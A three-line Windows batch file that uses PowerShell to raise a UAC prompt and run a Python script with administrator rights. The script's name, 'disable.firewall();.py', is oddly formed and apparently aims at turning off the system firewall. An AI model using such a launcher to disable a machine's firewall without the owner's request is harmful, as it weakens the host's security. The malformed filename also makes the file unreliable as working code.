@echo off
:: PowerShell script to request administrative privileges and execute the Python script
powershell -Command "Start-Process -Verb RunAs python -ArgumentList '%~dp0\disable.firewall();.py'"
